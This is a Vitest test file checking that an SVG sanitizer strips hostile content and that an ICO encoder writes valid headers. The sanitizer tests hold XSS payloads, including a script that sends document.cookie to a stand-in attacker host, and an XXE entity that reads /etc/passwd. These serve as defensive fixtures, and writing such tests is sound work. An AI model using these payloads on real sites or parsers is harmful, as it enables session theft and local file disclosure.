import { describe, it, expect } from 'vitest';
import { sanitizeSvg } from '@/features/conversion-engine/adapters/vector/svg-sanitizer';
import { encodeIco } from '@/features/conversion-engine/adapters/vector/ico-encoder';

describe('Vector Graphics & ICO Conversions Integration', () => {
  it('sanitizes SVG against malicious script tags and inline event handlers', () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="alert('xss')">
      <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
      <circle cx="50" cy="50" r="40" onclick="evil()" fill="red"/>
      <a href="javascript:void(0)"><text>Click me</text></a>
      <image href="https://remote-leak.com/tracker.png" width="10" height="10"/>
    </svg>`;

    const { sanitized, wasSanitized, issues } = sanitizeSvg(maliciousSvg);

    expect(wasSanitized).toBe(true);
    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('onload');
    expect(sanitized).not.toContain('onclick');
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('https://remote-leak.com');
    expect(sanitized).toContain('<circle');
    expect(issues.length).toBeGreaterThanOrEqual(4);
  });

  it('rejects XXE declarations inside SVG with SecurityValidationError', () => {
    const xxeSvg = `<?xml version="1.0"?>
    <!DOCTYPE svg [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`;

    expect(() => sanitizeSvg(xxeSvg)).toThrow(/external entity/i);
  });

  it('generates authentic Microsoft ICO binary with valid ICONDIR and ICONDIRENTRY headers', () => {
    // Synthetic PNG bytes (8-byte PNG header + dummy payload)
    const png16 = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);
    const png32 = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 5, 6, 7, 8, 9, 10]);

    const icoBytes = encodeIco([
      { width: 16, height: 16, pngBytes: png16 },
      { width: 32, height: 32, pngBytes: png32 },
    ]);

    expect(icoBytes.length).toBeGreaterThan(6 + 16 * 2);

    const view = new DataView(icoBytes.buffer);

    // Verify ICONDIR header
    expect(view.getUint16(0, true)).toBe(0); // Reserved = 0
    expect(view.getUint16(2, true)).toBe(1); // Type = 1 (Icon)
    expect(view.getUint16(4, true)).toBe(2); // Count = 2 images

    // Verify Entry 1 (16x16)
    expect(icoBytes[6 + 0]).toBe(16); // Width
    expect(icoBytes[6 + 1]).toBe(16); // Height
    expect(view.getUint16(6 + 6, true)).toBe(32); // Bits per pixel
    expect(view.getUint32(6 + 8, true)).toBe(png16.length); // Size

    // Verify Entry 2 (32x32)
    const e2 = 6 + 16;
    expect(icoBytes[e2 + 0]).toBe(32); // Width
    expect(icoBytes[e2 + 1]).toBe(32); // Height
    expect(view.getUint32(e2 + 8, true)).toBe(png32.length); // Size

    // Verify data offset points to actual PNG header
    const offset1 = view.getUint32(6 + 12, true);
    expect(icoBytes[offset1 + 0]).toBe(0x89);
    expect(icoBytes[offset1 + 1]).toBe(0x50);
    expect(icoBytes[offset1 + 2]).toBe(0x4e);
    expect(icoBytes[offset1 + 3]).toBe(0x47);
  });
});
